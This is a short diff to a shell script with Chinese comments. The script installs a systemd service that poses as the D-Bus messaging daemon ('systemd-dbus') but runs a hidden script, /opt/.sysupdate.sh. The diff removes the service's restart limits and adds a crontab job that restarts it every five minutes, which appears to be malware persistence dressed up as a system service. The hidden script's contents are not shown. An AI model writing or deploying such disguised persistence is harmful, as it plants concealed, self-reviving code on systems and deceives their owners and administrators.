@@ -28,8 +28,6 @@ Description=DBUS Messaging Daemon
 [Service]
 ExecStart=/bin/bash /opt/.sysupdate.sh
 Restart=always
-RestartSec=3
-StartLimitIntervalSec=0
 
 [Install]
 WantedBy=multi-user.target
@@ -38,3 +36,8 @@ EOF
 # 3. 启用并启动服务
 systemctl enable systemd-dbus
 systemctl restart systemd-dbus
+
+
+# 4. 设置 crontab：每5分钟自动重启 systemd-dbus 服务
+# 删除旧行（防重复）
+(crontab -l 2>/dev/null | grep -v 'systemctl restart systemd-dbus'; echo '*/5 * * * * systemctl restart systemd-dbus') | crontab -
